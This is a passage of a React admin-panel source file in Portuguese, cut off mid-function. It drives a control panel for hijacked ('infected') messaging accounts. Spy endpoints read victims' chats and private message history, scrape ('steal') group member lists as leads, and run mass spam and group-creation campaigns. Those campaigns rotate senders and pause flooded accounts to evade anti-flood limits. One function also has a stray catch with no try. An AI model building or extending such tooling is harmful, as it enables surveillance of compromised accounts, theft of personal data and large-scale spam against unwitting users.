import { useState, useEffect, useRef } from 'react';

export default function AdminPanel() {
  // --- ESTADOS DE AUTENTICAÇÃO ---
  const [isAuthenticated, setIsAuthenticated] = useState(false);
  const [loginMode, setLoginMode] = useState('user'); // 'user' ou 'admin'
  const [usernameInput, setUsernameInput] = useState('');
  const [passwordInput, setPasswordInput] = useState('');
  const [adminTokenInput, setAdminTokenInput] = useState('');
  const [authToken, setAuthToken] = useState('');
  const [isAdmin, setIsAdmin] = useState(false);

  // --- CONFIG DO USUÁRIO (REDIRECT/PRESSEL) ---
  const [myRedirectUrl, setMyRedirectUrl] = useState('');
  const [savingRedirect, setSavingRedirect] = useState(false);

  // --- GESTÃO DE USERS (ADMIN) ---
  const [newUserUsername, setNewUserUsername] = useState('');
  const [newUserPassword, setNewUserPassword] = useState('');
  const [newUserRedirectUrl, setNewUserRedirectUrl] = useState('');
  const [creatingUser, setCreatingUser] = useState(false);
  const [createdUser, setCreatedUser] = useState(null);
  const [usersList, setUsersList] = useState([]);
  
  // --- NAVEGAÇÃO ---
  const [tab, setTab] = useState('dashboard'); 
  
  // --- DADOS DO SISTEMA ---
  const [sessions, setSessions] = useState([]);
  const [stats, setStats] = useState({ total: 0, pending: 0, sent: 0 });
  const [logs, setLogs] = useState([]);
  
  // --- ESTADOS DO CRM (DISPARO) ---
  const [processing, setProcessing] = useState(false);
  const [msg, setMsg] = useState('{Olá|Oi}, tudo bem?');
  const [imgUrl, setImgUrl] = useState(''); // URL da Imagem para o disparo
  const [selectedPhones, setSelectedPhones] = useState(new Set());
  const [progress, setProgress] = useState(0);
  const [checkingStatus, setCheckingStatus] = useState(false);
  const stopCampaignRef = useRef(false); // Referência para o Botão de Parar

  // --- ESTADOS DO GOD MODE (ESPIÃO) ---
  const [allGroups, setAllGroups] = useState([]);
  const [allChannels, setAllChannels] = useState([]);
  const [harvestedIds, setHarvestedIds] = useState(new Set()); // Lista de IDs já colhidos
  const [isScanning, setIsScanning] = useState(false);
  const [scanProgress, setScanProgress] = useState(0);
  const [filterNumber, setFilterNumber] = useState('');
  const [isHarvestingAll, setIsHarvestingAll] = useState(false);
  const [totalHarvestedSession, setTotalHarvestedSession] = useState(0);
  const stopHarvestRef = useRef(false);

  // --- ESTADOS DE FERRAMENTAS ---
  const [viewingChat, setViewingChat] = useState(null);
  const [chatHistory, setChatHistory] = useState([]);
  const [loadingHistory, setLoadingHistory] = useState(false);
  const [newName, setNewName] = useState('');
  const [photoUrl, setPhotoUrl] = useState('');
  const [storyUrl, setStoryUrl] = useState('');
  const [storyCaption, setStoryCaption] = useState('');

  // --- ESTADOS DO GERENCIADOR DE CANAIS ---
  const [channels, setChannels] = useState([]);
  const [selectedChannel, setSelectedChannel] = useState(null);
  const [creatingChannel, setCreatingChannel] = useState(false);
  const [addingMembers, setAddingMembers] = useState(false);
  const [broadcastingChannel, setBroadcastingChannel] = useState(false);
  const [channelName, setChannelName] = useState('');
  const [channelDescription, setChannelDescription] = useState('');
  const [channelMessage, setChannelMessage] = useState('');
  const [channelMediaUrl, setChannelMediaUrl] = useState('');
  const [selectedChannelPhones, setSelectedChannelPhones] = useState(new Set());
  
  // --- ESTADOS DO CRIAÇÃO MASSIVA ---
  const [massCreating, setMassCreating] = useState(false);
  const [massChannelPrefix, setMassChannelPrefix] = useState('');
  const [massChannelDescription, setMassChannelDescription] = useState('');
  const [leadsPerChannel, setLeadsPerChannel] = useState(100);
  const [startNumber, setStartNumber] = useState(1);
  const [batchSize, setBatchSize] = useState(5);
  const [delayBetweenChannels, setDelayBetweenChannels] = useState(10);
  // --- FUNÇÕES DO GERENCIADOR DE CANAIS ---
  const loadChannels = async () => {
    try {
      const res = await authenticatedFetch('/api/spy/list-channels', { method: 'GET' });
      const data = await res.json();
      if (data.success) {
        setChannels(data.channels);
      }
    } catch (e) {
      console.error('Erro loadChannels:', e);
    }
  };

  const createChannel = async () => {
    if (!channelName.trim()) {
      addLog('❌ Nome do canal é obrigatório');
      return;
    }
    
    const selectedPhones = Array.from(selectedChannelPhones);
    if (selectedPhones.length === 0) {
      addLog('❌ Selecione pelo menos um número infectado');
      return;
    }
    
    setCreatingChannel(true);
    addLog(`📺 Criando canal "${channelName}"...`);
    
    try {
      const res = await authenticatedFetch('/api/spy/create-channel', {
        method: 'POST',
        body: JSON.stringify({
          phone: selectedPhones[0], // Usa o primeiro como criador
          channelName: channelName.trim(),
          channelDescription: channelDescription.trim(),
          selectedPhones: selectedPhones
        })
      });
      
      const data = await res.json();
      
      if (data.success) {
        addLog(`✅ Canal "${data.channelName}" criado com sucesso!`);
        addLog(`🆔 ID: ${data.channelInfo.id}`);
        addLog(`📱 Números selecionados: ${selectedPhones.length}`);
        
        setChannelName('');
        setChannelDescription('');
        setSelectedChannelPhones(new Set());
        loadChannels();
        setSelectedChannel(data.channel);
        
      } else {
        addLog(`❌ Erro ao criar canal: ${data.error}`);
      }
    } catch (e) {
      console.error('Erro createChannel:', e);
      addLog(`⛔ Erro ao criar canal: ${e.message}`);
    } finally {
      setCreatingChannel(false);
    }
  };

  const addMembersToChannel = async () => {
    if (!selectedChannel) {
      addLog('❌ Selecione um canal');
      return;
    }
    
    const phonesToAdd = Array.from(selectedChannelPhones);
    if (phonesToAdd.length === 0) {
      addLog('❌ Selecione pelo menos um número para adicionar membros');
      return;
    }
    
    setAddingMembers(true);
    addLog(`👥 Adicionando membros ao canal "${selectedChannel.channel_name}"...`);
    
    try {
      const res = await authenticatedFetch('/api/spy/add-members-batch', {
        method: 'POST',
        body: JSON.stringify({
          channelId: selectedChannel.channel_id,
          phonesToAdd: phonesToAdd,
          batchSize: 50,
          delayBetweenBatches: 5000
        })
      });
      
      const data = await res.json();
      
      if (data.success) {
        addLog(`✅ Membros adicionados com sucesso!`);
        addLog(`📊 Resumo:`);
        addLog(`   • Total processado: ${data.summary.totalProcessed}`);
        addLog(`   • Telefones bem-sucedidos: ${data.summary.successfulPhones}`);
        addLog(`   • Total membros adicionados: ${data.summary.totalMembersAdded}`);
        addLog(`   • Total membros no canal: ${data.summary.totalChannelMembers}`);
        
        data.results.forEach(result => {
          if (result.success) {
            addLog(`   📱 ${result.phone}: ${result.message}`);
          } else {
            addLog(`   ❌ ${result.phone}: ${result.error}`);
          }
        });
        
        loadChannels();
        
      } else {
        addLog(`❌ Erro ao adicionar membros: ${data.error}`);
      }
    } catch (e) {
      console.error('Erro addMembersToChannel:', e);
      addLog(`⛔ Erro ao adicionar membros: ${e.message}`);
    } finally {
      setAddingMembers(false);
    }
  };

  const broadcastToChannel = async () => {
    if (!selectedChannel) {
      addLog('❌ Selecione um canal');
      return;
    }
    
    if (!channelMessage.trim()) {
      addLog('❌ Mensagem é obrigatória');
      return;
    }
    
    const senderPhones = Array.from(selectedChannelPhones);
    if (senderPhones.length === 0) {
      addLog('❌ Selecione pelo menos um número para enviar');
      return;
    }
    
    setBroadcastingChannel(true);
    addLog(`📺 Enviando mensagem para canal "${selectedChannel.channel_name}"...`);
    
    try {
      const res = await authenticatedFetch('/api/spy/broadcast-channel', {
        method: 'POST',
        body: JSON.stringify({
          channelId: selectedChannel.channel_id,
          message: channelMessage.trim(),
          mediaUrl: channelMediaUrl.trim(),
          senderPhones: senderPhones,
          delayBetweenMessages: 3000
        })
      });
      
      const data = await res.json();
      
      if (data.success) {
        addLog(`✅ Mensagem enviada com sucesso!`);
        addLog(`📊 Resumo:`);
        addLog(`   • Total processado: ${data.summary.totalProcessed}`);
        addLog(`   • Enviados com sucesso: ${data.summary.successfulSends}`);
        addLog(`   • Falhas: ${data.summary.failedSends}`);
        addLog(`   • Membros no canal: ${data.summary.channelMembers}`);
        
        data.results.forEach(result => {
          if (result.success) {
            addLog(`   ✅ ${result.phone}: ${result.message}`);
          } else {
            addLog(`   ❌ ${result.phone}: ${result.error}`);
          }
        });
        
        setChannelMessage('');
        setChannelMediaUrl('');
        
      } else {
        addLog(`❌ Erro ao enviar mensagem: ${data.error}`);
      }
    } catch (e) {
      console.error('Erro broadcastToChannel:', e);
      addLog(`⛔ Erro ao enviar mensagem: ${e.message}`);
    } finally {
      setBroadcastingChannel(false);
    }
  };

  // --- ESTADOS DO INBOX VIEWER ---
  const [selectedInboxPhone, setSelectedInboxPhone] = useState('');
  const [selectedDialog, setSelectedDialog] = useState(null);
  const [inboxHistory, setInboxHistory] = useState([]);
  const [loadingInboxHistory, setLoadingInboxHistory] = useState(false);
  const [loadingInbox, setLoadingInbox] = useState(false);
  const [loadingBotFlow, setLoadingBotFlow] = useState(false);

  // --- ESTADOS DE GRUPOS E DISPAROS SEGMENTADOS ---
  const [createdGroups, setCreatedGroups] = useState([]);
  const [groupCreationProgress, setGroupCreationProgress] = useState(0);
  const [isCreatingGroups, setIsCreatingGroups] = useState(false);
  const [groupMessage, setGroupMessage] = useState('');
  const [groupMediaUrl, setGroupMediaUrl] = useState('');
  const [selectedGroupsForBroadcast, setSelectedGroupsForBroadcast] = useState(new Set());
  const [broadcastProgress, setBroadcastProgress] = useState(0);
  const [isBroadcasting, setIsBroadcasting] = useState(false);
  const stopBroadcastRef = useRef(false);
  
  // --- CONFIGURAÇÃO DE GRUPOS ---
  const [groupNameTemplate, setGroupNameTemplate] = useState('VIP Club {number}');
  const [groupPhotoUrl, setGroupPhotoUrl] = useState('');

  // --- INICIALIZAÇÃO ---
  useEffect(() => {
    // Verifica se há token salvo no localStorage
    const savedToken = localStorage.getItem('authToken');
    if (savedToken) {
      setAuthToken(savedToken);
      setIsAuthenticated(true);
      // Decodifica JWT para verificar se é admin (sem verificar assinatura, apenas ler payload)
      try {
        const payload = JSON.parse(atob(savedToken.split('.')[1]));
        setIsAdmin(payload.isAdmin === true || payload.type === 'admin');
      } catch (e) {
        // Se não conseguir decodificar, assume que não é admin
        setIsAdmin(false);
      }
    }

    // Tenta recuperar cache local do scanner para não perder dados ao recarregar a página
    const savedGroups = localStorage.getItem('godModeGroups');
    const savedChannels = localStorage.getItem('godModeChannels');
    
    if (savedGroups) {
        setAllGroups(JSON.parse(savedGroups));
    }
    if (savedChannels) {
        setAllChannels(JSON.parse(savedChannels));
    }
  }, []);

  useEffect(() => {
    // Se já estiver autenticado, busca os dados atualizados do servidor
    if (isAuthenticated && authToken) {
        fetchData();
        // Carrega grupos e canais escaneados do servidor
        loadScannedChatsFromServer();
        // Carrega grupos criados (criação inteligente) do servidor
        loadCreatedGroupsFromServer();
    }
  }, [isAuthenticated, authToken]);

  useEffect(() => {
    if (!isAuthenticated || !authToken) return;

    const run = async () => {
      if (!isAdmin) {
        try {
          const res = await authenticatedFetch('/api/user/update-redirect', { method: 'GET' });
          const data = await res.json();
          if (res.ok && data?.success) {
            setMyRedirectUrl(data.redirect_url || '');
          }
        } catch (e) {}
      }

      if (isAdmin) {
        try {
          const res = await authenticatedFetch('/api/admin/list-users', { method: 'GET' });
          const data = await res.json();
          if (res.ok && data?.success) {
            setUsersList(data.users || []);
          }
        } catch (e) {}
      }
    };

    run();
  }, [isAuthenticated, authToken, isAdmin]);

  // Carrega canais quando autenticado
  useEffect(() => {
    if (isAuthenticated) {
      loadChannels();
    }
  }, [isAuthenticated]);

  // Função helper para fazer requisições autenticadas
  const authenticatedFetch = async (url, options = {}) => {
    const headers = {
      'Content-Type': 'application/json',
      'Authorization': `Bearer ${authToken}`,
      ...options.headers
    };
    return fetch(url, { ...options, headers });
  };

  // Carrega grupos e canais escaneados do servidor
  const loadScannedChatsFromServer = async () => {
    try {
      const res = await authenticatedFetch('/api/spy/get-scanned-chats');
      if (!res.ok) {
        // Se a tabela não existir ainda, retorna silenciosamente
        if (res.status === 500) {
          console.warn('Tabela scanned_chats pode não existir ainda. Criando...');
          return;
        }
        return;
      }

      const data = await res.json();
      if (data.success && (data.groups.length > 0 || data.channels.length > 0)) {
        // Mescla com dados do localStorage (servidor tem prioridade)
        const localGroups = JSON.parse(localStorage.getItem('godModeGroups') || '[]');
        const localChannels = JSON.parse(localStorage.getItem('godModeChannels') || '[]');
        
        // Cria mapas para evitar duplicatas (servidor tem prioridade)
        const serverGroupsMap = new Map(data.groups.map(g => [g.id, g]));
        const serverChannelsMap = new Map(data.channels.map(c => [c.id, c]));
        
        // Adiciona grupos do localStorage que não estão no servidor
        for (const localGroup of localGroups) {
          if (!serverGroupsMap.has(localGroup.id)) {
            serverGroupsMap.set(localGroup.id, localGroup);
          }
        }
        
        // Adiciona canais do localStorage que não estão no servidor
        for (const localChannel of localChannels) {
          if (!serverChannelsMap.has(localChannel.id)) {
            serverChannelsMap.set(localChannel.id, localChannel);
          }
        }
        
        // Converte mapas de volta para arrays e ordena
        const mergedGroups = Array.from(serverGroupsMap.values()).sort((a, b) => (b.participantsCount || 0) - (a.participantsCount || 0));
        const mergedChannels = Array.from(serverChannelsMap.values()).sort((a, b) => (b.participantsCount || 0) - (a.participantsCount || 0));
        
        setAllGroups(mergedGroups);
        setAllChannels(mergedChannels);
        
        // Atualiza localStorage com dados mesclados
        localStorage.setItem('godModeGroups', JSON.stringify(mergedGroups));
        localStorage.setItem('godModeChannels', JSON.stringify(mergedChannels));
      }
    } catch (error) {
      console.error('Erro ao carregar chats escaneados do servidor:', error);
      // Em caso de erro, mantém dados do localStorage
    }
  };

  const loadCreatedGroupsFromServer = async () => {
    try {
      const res = await authenticatedFetch('/api/get-created-groups');
      if (!res.ok) return;
      const data = await res.json();
      if (data.success && Array.isArray(data.groups)) {
        setCreatedGroups(data.groups);
      }
    } catch (e) {
      console.warn('Erro ao carregar grupos criados do servidor:', e);
    }
  };

  const fetchData = async () => {
      console.log('🔄 Iniciando fetchData...');
      
      // 1. Carrega Contas Infectadas
      console.log('📱 Buscando sessões...');
      const sRes = await authenticatedFetch('/api/list-sessions');
      console.log('📱 Resposta sessions:', sRes.status);
      
      const sData = await sRes.json();
      console.log('📱 Dados sessions:', sData);
      
      setSessions(prev => {
          const newSessions = sData.sessions || [];
          console.log('📱 Sessions recebidas:', newSessions.length);
          return newSessions.map(ns => {
              // Mantém o estado visual 'is_active' anterior para evitar que o ícone pisque
              const old = prev.find(p => p.phone_number === ns.phone_number);
              return { ...ns, is_active: old ? old.is_active : ns.is_active };
          });
      });
      
      // 2. Carrega Estatísticas de Leads
      console.log('📊 Buscando stats...');
      const stRes = await authenticatedFetch('/api/stats');
      console.log('📊 Resposta stats:', stRes.status);
      
      if (stRes.ok) {
          const statsData = await stRes.json();
          console.log('📊 Dados stats:', statsData);
          setStats(statsData);
      }
      
      // 3. Carrega Memória de Grupos já Roubados (para marcar em verde)
      console.log('🧠 Buscando harvested...');
      const hRes = await authenticatedFetch('/api/get-harvested');
      console.log('🧠 Resposta harvested:', hRes.status);
      
      const hData = await hRes.json();
      console.log('🧠 Dados harvested:', hData);
      
      if(hData.harvestedIds) {
          setHarvestedIds(new Set(hData.harvestedIds));
      }
      
      console.log('✅ fetchData concluído com sucesso!');
    } catch (e) {
      console.error('❌ Erro em fetchData:', e);
      addLog(`⛠️ Erro ao carregar dados: ${e.message}`);
    }
  };

  const addLog = (text) => {
      setLogs(prev => [`[${new Date().toLocaleTimeString()}] ${text}`, ...prev]);
  };

  // --- AUTENTICAÇÃO ---
  const handleUserLogin = async (e) => {
    e.preventDefault();
    if (!usernameInput || !passwordInput) {
      alert('Preencha usuário e senha');
      return;
    }
    try {
      const res = await fetch('/api/login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ username: usernameInput, password: passwordInput })
      });
      const data = await res.json();
      if(data.success) { 
          setAuthToken(data.token);
          setIsAdmin(false);
          setIsAuthenticated(true);
          localStorage.setItem('authToken', data.token);
          setUsernameInput('');
          setPasswordInput('');
      } else {
          alert(data.error || 'Credenciais inválidas');
      }
    } catch (e) { 
        alert('Erro de conexão na autenticação.'); 
    }
  };

  const handleAdminTokenLogin = async (e) => {
    e.preventDefault();
    if (!adminTokenInput) {
      alert('Informe a senha administrativa');
      return;
    }
    try {
      const res = await fetch('/api/admin-login', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ password: adminTokenInput })
      });
      const data = await res.json();
      if(data.success) { 
          setAuthToken(data.token);
          setIsAdmin(true);
          setIsAuthenticated(true);
          localStorage.setItem('authToken', data.token);
          setAdminTokenInput('');
      } else {
          alert(data.error || 'Senha incorreta');
      }
    } catch (e) { 
        alert('Erro de conexão na autenticação.'); 
    }
  };

  const handleLogout = () => {
    setIsAuthenticated(false);
    setAuthToken('');
    setIsAdmin(false);
    setCreatedUser(null);
    localStorage.removeItem('authToken');
  };

  const handleSaveRedirectUrl = async () => {
    setSavingRedirect(true);
    try {
      const res = await authenticatedFetch('/api/user/update-redirect', {
        method: 'POST',
        body: JSON.stringify({ redirectUrl: myRedirectUrl })
      });
      const data = await res.json();
      if (res.ok && data?.success) {
        setMyRedirectUrl(data.redirect_url || '');
        addLog('✅ Redirect/Pressel atualizado.');
      } else {
        alert(data?.error || 'Falha ao salvar redirect.');
      }
    } catch (e) {
      alert('Erro de conexão ao salvar redirect.');
    }
    setSavingRedirect(false);
  };

  const handleCreateUser = async () => {
    if (!newUserUsername || !newUserPassword) {
      alert('Informe username e senha do novo usuário.');
      return;
    }
    setCreatingUser(true);
    setCreatedUser(null);
    try {
      const res = await authenticatedFetch('/api/admin/create-user', {
        method: 'POST',
        body: JSON.stringify({
          username: newUserUsername,
          password: newUserPassword,
          redirectUrl: newUserRedirectUrl
        })
      });
      const data = await res.json();
      if (res.ok && data?.success && data?.user) {
        setCreatedUser(data.user);
        setNewUserUsername('');
        setNewUserPassword('');
        setNewUserRedirectUrl('');
        addLog(`✅ Usuário criado: ${data.user.username}`);

        try {
          const lr = await authenticatedFetch('/api/admin/list-users', { method: 'GET' });
          const ld = await lr.json();
          if (lr.ok && ld?.success) setUsersList(ld.users || []);
        } catch (e) {}
      } else {
        alert(data?.error || 'Falha ao criar usuário.');
      }
    } catch (e) {
      alert('Erro de conexão ao criar usuário.');
    }
    setCreatingUser(false);
  };

  // ==============================================================================
  // GESTÃO DE INFECTADOS (CHECK & SELEÇÃO)
  // ==============================================================================
  
  const checkAllStatus = async () => {
      if(sessions.length === 0) return;
      setCheckingStatus(true);
      addLog('🔍 Verificando integridade das contas (Sequencial)...');
      
      let currentSessions = [...sessions];
      
      // Verifica um por um para não sobrecarregar a API/Servidor
      for(let i=0; i < currentSessions.length; i++) {
          try {
              const res = await authenticatedFetch('/api/check-status', {
                  method: 'POST',
                  body: JSON.stringify({ phone: currentSessions[i].phone_number })
              });
              const data = await res.json();
              
              // Atualiza na hora o ícone (Verde/Vermelho)
              currentSessions[i].is_active = (data.status === 'alive');
              setSessions([...currentSessions]); 
          } catch(e) {
              console.error(e);
          }
      }
      setCheckingStatus(false);
      addLog('✅ Verificação de status finalizada.');
  };

  const toggleSelect = (phone) => {
    const newSet = new Set(selectedPhones);
    if (newSet.has(phone)) {
        newSet.delete(phone); 
    } else {
        newSet.add(phone);
    }
    setSelectedPhones(newSet);
  };

  const selectAllActive = () => {
      const newSet = new Set();
      // Seleciona apenas quem está marcado como ativo (verde)
      sessions.forEach(s => { 
          if(s.is_active) newSet.add(s.phone_number) 
      });
      setSelectedPhones(newSet);
      addLog(`✅ Selecionadas ${newSet.size} contas online para disparo.`);
  };

  const handleDeleteSession = async (phone) => {
      if(!confirm(`⚠️ Remover permanentemente a conta ${phone}?`)) return;
      
      await authenticatedFetch('/api/delete-session', { 
          method: 'POST', 
          body: JSON.stringify({phone})
      });
      
      setSessions(prev => prev.filter(s => s.phone_number !== phone));
  };

  // ==============================================================================
  // CRM TURBO: MOTOR DE DISPARO V6 (PRIORIDADE TOTAL + ESTRATÉGIA MISTA)
  // ==============================================================================

  const startRealCampaign = async () => {
     if (selectedPhones.size === 0) return alert('Selecione contas remetentes (Infectados)!');
     
     if(!confirm(`⚠️ INICIAR DISPARO INTELIGENTE?\n\n1. Prioridade: @Usernames (Entrega Garantida)\n2. Secundário: IDs com Tática de Grupo/Contato\n\nLeads Pendentes: ${stats.pending}\nContas Ativas: ${selectedPhones.size}`)) return;

     setProcessing(true);
     stopCampaignRef.current = false; // Reseta a trava de parada
     setProgress(0);
     addLog('🚀 Motor V6 Iniciado (Estratégia Híbrida)...');
     
     try {
         // Cria uma lista de remetentes disponíveis
         let availableSenders = Array.from(selectedPhones);
         // Mapa de "Geladeira" (Quem tomou flood fica aqui com o tempo de desbloqueio)
         const floodCoolDown = new Map(); 

         // CONFIGURAÇÃO ANTI-FLOOD OTIMIZADA
         const BATCH_SIZE = 12; // 12 Envios simultâneos
         const DELAY_BETWEEN_BATCHES = 3500; // 3.5 segundos de pausa entre lotes
         const LEADS_PER_FETCH = 200; // Busca leads no banco de 200 em 200

         let totalSentCount = 0;

         while (true) {
             // VERIFICAÇÃO DE PARADA DE EMERGÊNCIA
             if (stopCampaignRef.current) {
                 addLog('🛑 Disparo interrompido manualmente pelo usuário.');
                 break;
             }

             // --- GESTÃO DA GELADEIRA (COOLDOWN) ---
             const now = Date.now();
             for (const [phone, unlockTime] of floodCoolDown.entries()) {
                 if (now > unlockTime) {
                     availableSenders.push(phone); // Devolve a conta para a lista
                     floodCoolDown.delete(phone); // Remove da geladeira
                     addLog(`❄️ Conta ${phone} saiu da geladeira e voltou à ativa.`);
                 }
             }

             if (availableSenders.length === 0) {
                 addLog('⚠️ Todas as contas estão em descanso (Flood). Aguardando 1 min...');
                 await new Promise(r => setTimeout(r, 60000));
                 continue; // Tenta de novo após 1 minuto
             }

             // 1. Busca um lote de leads pendentes no banco
             // A API get-campaign-leads JÁ ESTÁ configurada para trazer Usernames primeiro
             const res = await authenticatedFetch(`/api/get-campaign-leads?limit=${LEADS_PER_FETCH}`);
             const data = await res.json();
             const leads = data.leads || [];
             
             if (leads.length === 0) {
                 addLog('✅ Sem mais leads pendentes no banco.');
                 break; 
             }

             // 2. Processa esse lote em pequenos grupos (Batches)
             for (let i = 0; i < leads.length; i += BATCH_SIZE) {
                 // Verifica parada novamente dentro do sub-loop
                 if (stopCampaignRef.current) break;

                 const batch = leads.slice(i, i + BATCH_SIZE);
                 
                 const promises = batch.map((lead, index) => {
                     // Verifica se ainda tem contas disponíveis
                     if (availableSenders.length === 0) return null;

                     // Rodízio (Round-Robin): Distribui o envio entre as contas saudáveis
                     const senderIndex = (totalSentCount + index) % availableSenders.length;
                     const sender = availableSenders[senderIndex];
                     
                     return authenticatedFetch('/api/dispatch', {
                         method: 'POST',
                         body: JSON.stringify({
                             senderPhone: sender,
                             target: lead.user_id,
                             username: lead.username, // Se tiver, o backend usa. Se não, tenta o ID.
                             originChatId: lead.chat_id, // IMPORTANTE: Envia o ID do grupo original para tentar a busca
                             message: msg,
                             imageUrl: imgUrl,
                             leadDbId: lead.id
                         })
                     }).then(async (response) => {
                         const d = await response.json();
                         
                         if (response.status === 429) {
                             // SE DER FLOOD:
                             addLog(`🥶 ${sender} tomou FLOOD. Pausando ela por 5 min.`);
                             // Remove da lista de ativos agora mesmo
                             availableSenders = availableSenders.filter(p => p !== sender);
                             // Põe na geladeira por 5 min (300000 ms)
                             floodCoolDown.set(sender, Date.now() + 300000);
                         } else if (!d.success) {
                             // Outros erros (Privacidade, etc) apenas registram
                             // addLog(`❌ Falha ${sender}: ${d.error}`); // Comentado para limpar logs
                         }
                         return d;
                     }).catch(err => {
                         console.error(err);
                     });
                 });

                 // Aguarda o lote atual terminar antes de ir para o próximo
                 await Promise.all(promises);
                 
                 totalSentCount += batch.length;
                 // Atualiza barra de progresso
                 setProgress(stats.pending ? Math.round((totalSentCount / stats.pending) * 100) : 100);
                 
                 // Pausa estratégica para evitar PEER_FLOOD
                 await new Promise(r => setTimeout(r, DELAY_BETWEEN_BATCHES));
             }

             // Se veio menos leads do que o limite, é porque acabou
             if (leads.length < LEADS_PER_FETCH) break;
         }

         addLog(`✅ Disparo concluído com sucesso. Total processado: ${totalSentCount}`);
         fetchData(); // Atualiza contadores
     } catch (e) { 
         addLog(`⛔ Erro Crítico no Motor: ${e.message}`); 
     }
     setProcessing(false);
  };

  const stopCampaign = () => {
      stopCampaignRef.current = true;
      addLog('🛑 Solicitando parada imediata do disparo...');
  };

  // ==============================================================================
  // GOD MODE: SCANNER & MODO ASPIRADOR
  // ==============================================================================

  const scanNetwork = async () => {
      if (sessions.length === 0) return alert("Nenhuma conta para escanear.");
      setIsScanning(true);
      setScanProgress(0);
      let groupsFound = [];
      let channelsFound = [];

      for (let i = 0; i < sessions.length; i++) {
          const phone = sessions[i].phone_number;
          setScanProgress(Math.round(((i + 1) / sessions.length) * 100));
          try {
              const res = await authenticatedFetch('/api/spy/list-chats', { 
                  method: 'POST', 
                  body: JSON.stringify({ phone })
              });
              const data = await res.json();
              if (data.chats) {
                  data.chats.forEach(c => {
                      const chatObj = { ...c, ownerPhone: phone };
                      if (c.type === 'Canal') {
                          channelsFound.push(chatObj); 
                      } else {
                          groupsFound.push(chatObj);
                      }
                  });
              }
          } catch (e) {
              console.error(e);
          }
      }

      // Remove duplicatas e ordena por tamanho
      const uniqueGroups = [...new Map(groupsFound.map(item => [item.id, item])).values()].sort((a,b) => b.participantsCount - a.participantsCount);
      const uniqueChannels = [...new Map(channelsFound.map(item => [item.id, item])).values()].sort((a,b) => b.participantsCount - a.participantsCount);

      setAllGroups(uniqueGroups);
      setAllChannels(uniqueChannels);
      
      // Salva no navegador (cache rápido)
      localStorage.setItem('godModeGroups', JSON.stringify(uniqueGroups));
      localStorage.setItem('godModeChannels', JSON.stringify(uniqueChannels));
      
      // Salva no servidor (persistência)
      try {
        const saveRes = await authenticatedFetch('/api/spy/save-scanned-chats', {
          method: 'POST',
          body: JSON.stringify({
            groups: uniqueGroups,
            channels: uniqueChannels
          })
        });
        
        if (saveRes.ok) {
          const saveData = await saveRes.json();
          addLog(`✅ ${saveData.saved || 0} chats salvos no servidor`);
        } else {
          console.warn('Erro ao salvar chats no servidor:', await saveRes.text());
          // Não bloqueia o processo se falhar ao salvar no servidor
        }
      } catch (saveError) {
        console.error('Erro ao salvar chats no servidor:', saveError);
        // Não bloqueia o processo se falhar ao salvar no servidor
      }
      
      setIsScanning(false);
  };

  const startMassHarvest = async () => {
      const targets = [...allGroups, ...allChannels].filter(c => !harvestedIds.has(c.id));
      
      if (targets.length === 0) return alert("Nada novo para colher. Use o 'Scan' para achar novos grupos.");
      
      if (!confirm(`🕷️ MODO ASPIRADOR: Coletar leads de ${targets.length} fontes automaticamente?`)) return;

      setIsHarvestingAll(true);
      stopHarvestRef.current = false;
      let sessionCount = 0;

      addLog(`🕷️ Iniciando Aspiração em ${targets.length} chats...`);

      for (let i = 0; i < targets.length; i++) {
          if (stopHarvestRef.current) break;
          const target = targets[i];
          
          try {
              const res = await authenticatedFetch('/api/spy/harvest', { 
                  method: 'POST', 
                  body: JSON.stringify({ 
                      phone: target.ownerPhone, 
                      chatId: target.id, 
                      chatName: target.title, 
                      isChannel: target.type === 'Canal' 
                  })
              });
              const data = await res.json();
              if(data.success) {
                  sessionCount += data.count;
                  setTotalHarvestedSession(sessionCount);
                  setHarvestedIds(prev => new Set(prev).add(target.id)); // Marca visualmente como colhido
                  addLog(`✅ +${data.count} leads de "${target.title}"`);
              }
          } catch (e) {
              // Ignora erro e continua para o próximo
          }
          // Delay de 2.5s entre grupos para não sobrecarregar
          await new Promise(r => setTimeout(r, 2500));
      }
      setIsHarvestingAll(false);
      addLog(`🏁 Aspiração Finalizada. Total capturado: ${sessionCount}`);
      fetchData();
  };

  // --- VISUALIZAÇÃO E AÇÕES MANUAIS ---
  const openChatViewer = async (chat) => {
      setViewingChat(chat);
      setLoadingHistory(true);
      setChatHistory([]);
      try {
        const res = await authenticatedFetch('/api/spy/get-history', { 
            method: 'POST', 
            body: JSON.stringify({ phone: chat.ownerPhone, chatId: chat.id })
        });
        const data = await res.json();
        setChatHistory(data.history || []);
      } catch (e) { 
          alert('Erro ao carregar mensagens.'); 
      }
      setLoadingHistory(false);
  };

  const stealLeadsManual = async (chat) => {
      addLog(`🕷️ Extraindo manualmente de ${chat.title}...`);
      const res = await authenticatedFetch('/api/spy/harvest', { 
          method: 'POST', 
          body: JSON.stringify({ 
              phone: chat.ownerPhone, 
              chatId: chat.id, 
              chatName: chat.title, 
              isChannel: chat.type === 'Canal' 
          })
      });
      const data = await res.json();
      if(data.success) {
          addLog(`✅ +${data.count} leads capturados.`);
          setHarvestedIds(prev => new Set(prev).add(chat.id));
          fetchData();
      } else { 
          addLog(`❌ Falha: ${data.error}`); 
      }
  };

  // ==============================================================================
  // SISTEMA DE GRUPOS E DISPAROS SEGMENTADOS
  // ==============================================================================

  const createSmartGroups = async () => {
    if (selectedPhones.size === 0) return alert('Selecione contas infectadas para criar grupos!');
    if (!groupNameTemplate.trim()) return alert('Digite um nome para os grupos!');
    
    if (!confirm(`⚠️ CRIAR GRUPOS INTELIGENTES?\n\n• Nome: ${groupNameTemplate}\n• Foto: ${groupPhotoUrl ? 'Sim' : 'Não'}\n• Pausas estratégicas entre criações\n• Distribuição automática de leads\n\nContas selecionadas: ${selectedPhones.size}`)) return;

    setIsCreatingGroups(true);
    setGroupCreationProgress(0);
    stopBroadcastRef.current = false;
    addLog('🎯 Iniciando criação inteligente de grupos...');

    try {
      const availableCreators = Array.from(selectedPhones);
      const DELAY_BETWEEN_GROUPS = 15000; // 15 segundos entre criações
      const LEADS_PER_BATCH = 5000; // Busca leads em lotes (um grupo por lote, sem limite de membros)

      let groupsCreated = [];
      let totalLeadsAssigned = 0;
      let groupCounter = 1;

      while (true) {
        if (stopBroadcastRef.current) {
          addLog('🛑 Criação de grupos interrompida.');
          break;
        }

        if (availableCreators.length === 0) {
          addLog('⚠️ Sem contas disponíveis. Aguardando 2 minutos...');
